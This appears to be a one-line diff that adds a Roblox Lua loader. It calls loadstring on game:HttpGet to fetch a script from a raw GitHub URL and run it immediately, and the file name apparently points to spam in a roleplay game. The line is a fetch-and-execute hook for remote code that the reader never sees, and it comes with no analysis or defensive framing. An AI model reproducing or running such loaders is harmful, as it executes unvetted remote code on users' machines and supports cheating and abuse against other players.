@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/upd-facility-roleplay-spam7-gzgv47tqoaaoz1.lua"))()
